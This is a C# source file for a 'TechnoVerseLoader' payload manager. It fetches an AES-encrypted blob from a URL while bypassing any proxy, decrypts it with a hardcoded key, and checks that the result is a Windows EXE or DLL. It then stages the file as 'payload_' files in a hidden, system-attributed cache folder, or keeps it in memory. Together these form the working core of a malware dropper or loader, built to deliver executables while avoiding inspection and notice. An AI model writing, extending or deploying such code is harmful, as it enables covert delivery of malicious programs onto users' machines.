using System;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace TechnoVerseLoader.Services
{
    public enum PayloadType
    {
        Unknown,
        Dll,
        Exe
    }

    public class DecryptedPayload
    {
        public byte[] RawBytes { get; init; } = Array.Empty<byte>();
        public PayloadType Type { get; init; }
        public string TempFilePath { get; init; } = "";
    }

    public static class PayloadManager
    {
        private const string AesKey = "TechnoVerse2026!TechnoVerse2026!"; // 32 bytes = AES-256
        private const string AesIv = "TVLoader2026!IV!"; // 16 bytes

        private static readonly HttpClient HttpClient = new HttpClient(new SocketsHttpHandler
        {
            UseProxy = false,
            Proxy = null
        })
        {
            Timeout = TimeSpan.FromMinutes(5)
        };

        static PayloadManager()
        {
            HttpClient.DefaultRequestHeaders.UserAgent.ParseAdd("TechnoVerse-Loader/1.0");
        }

        public static async Task<DecryptedPayload?> DownloadAndDecryptAsync(
            string url,
            IProgress<int>? progress = null)
        {
            try
            {
                using var response = await HttpClient.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
                response.EnsureSuccessStatusCode();

                long totalBytes = response.Content.Headers.ContentLength ?? -1L;
                using var stream = await response.Content.ReadAsStreamAsync();

                using var ms = new MemoryStream();
                byte[] buffer = new byte[8192];
                long totalRead = 0;
                int bytesRead;

                while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                {
                    await ms.WriteAsync(buffer, 0, bytesRead);
                    totalRead += bytesRead;

                    if (totalBytes > 0)
                    {
                        progress?.Report((int)((totalRead * 100) / totalBytes));
                    }
                }

                byte[] encryptedBytes = ms.ToArray();
                byte[]? decryptedBytes = AesDecrypt(encryptedBytes, AesKey, AesIv);

                if (decryptedBytes == null || decryptedBytes.Length < 2)
                    return null;

                PayloadType type = DetectPayloadType(decryptedBytes);
                if (type == PayloadType.Unknown)
                    return null;

                return new DecryptedPayload
                {
                    RawBytes = decryptedBytes,
                    Type = type,
                    TempFilePath = ""
                };
            }
            catch
            {
                return null;
            }
        }

        public static string WriteToTempFile(DecryptedPayload payload, string extension)
        {
            string tempDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "TechnoVerse", ".cache");

            if (!Directory.Exists(tempDir))
            {
                Directory.CreateDirectory(tempDir);
                File.SetAttributes(tempDir,
                    File.GetAttributes(tempDir) | FileAttributes.Hidden | FileAttributes.System);
            }

            string tempFile = Path.Combine(tempDir, $"payload_{Guid.NewGuid():N}{extension}");
            File.WriteAllBytes(tempFile, payload.RawBytes);
            File.SetAttributes(tempFile,
                File.GetAttributes(tempFile) | FileAttributes.Hidden | FileAttributes.System);

            return tempFile;
        }

        public static void CleanupFile(string filePath)
        {
            try
            {
                if (!string.IsNullOrEmpty(filePath) && File.Exists(filePath))
                {
                    File.SetAttributes(filePath, File.GetAttributes(filePath) & ~FileAttributes.Hidden & ~FileAttributes.System);
                    File.Delete(filePath);
                }
            }
            catch { }
        }

        public static DecryptedPayload? DecryptInMemory(byte[] encryptedBytes)
        {
            byte[]? decryptedBytes = AesDecrypt(encryptedBytes, AesKey, AesIv);
            if (decryptedBytes == null || decryptedBytes.Length < 2)
                return null;

            PayloadType type = DetectPayloadType(decryptedBytes);
            if (type == PayloadType.Unknown)
                return null;

            return new DecryptedPayload
            {
                RawBytes = decryptedBytes,
                Type = type,
                TempFilePath = ""
            };
        }

        private static byte[]? AesDecrypt(byte[] cipherData, string key, string iv)
        {
            using var aes = Aes.Create();
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.IV = Encoding.UTF8.GetBytes(iv);
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using var decryptor = aes.CreateDecryptor();
            try
            {
                return decryptor.TransformFinalBlock(cipherData, 0, cipherData.Length);
            }
            catch
            {
                return null;
            }
        }

        private static PayloadType DetectPayloadType(byte[] data)
        {
            if (data.Length < 2)
                return PayloadType.Unknown;

            // MZ header check
            if (data[0] != 0x4D || data[1] != 0x5A)
                return PayloadType.Unknown;

            if (data.Length < 64)
                return PayloadType.Unknown;

            int peOffset = BitConverter.ToInt32(data, 60);
            if (peOffset < 0 || peOffset + 4 >= data.Length)
                return PayloadType.Unknown;

            // PE signature check
            if (data[peOffset] != 0x50 || data[peOffset + 1] != 0x45)
                return PayloadType.Unknown;

            if (peOffset + 24 >= data.Length)
                return PayloadType.Unknown;

            int characteristics = BitConverter.ToUInt16(data, peOffset + 22);

            // IMAGE_FILE_DLL = 0x2000
            if ((characteristics & 0x2000) != 0)
                return PayloadType.Dll;

            return PayloadType.Exe;
        }
    }
}
